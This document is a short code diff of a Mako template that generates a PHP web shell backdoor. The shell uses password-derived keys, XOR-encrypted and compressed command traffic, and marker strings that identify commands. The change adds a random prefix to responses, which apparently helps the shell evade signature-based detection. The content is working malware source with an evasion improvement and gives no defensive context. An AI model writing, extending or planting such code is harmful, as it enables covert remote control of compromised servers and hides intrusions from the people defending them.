@@ -1,11 +1,14 @@
-<%! import hashlib %><%
+<%! import hashlib, utils, string %><%
 passwordhash = hashlib.md5(password).hexdigest().lower()
 key = passwordhash[:8]
 header = passwordhash[8:20]
 footer = passwordhash[20:32]
+
+PREPEND = utils.strings.randstr(24, charset = string.digits + string.letters + ' !#%&\()*+,-./:;<=>?@[]^_{|}~')
 %>$k="${key}";
 $kh="${header}";
 $kf="${footer}";
+$p="${PREPEND}";
 <%text>
 function x($t,$k){
 	$c=strlen($k);
@@ -26,6 +29,6 @@ if (preg_match("/$kh(.+)$kf/", $d, $m) == 1) {
   $o=ob_get_contents();
   ob_end_clean();
   $r=base64_encode(x(gzcompress($o),$k));
-  print("$kh$r$kf");
+  print("$p$kh$r$kf");
 }
 </%text>
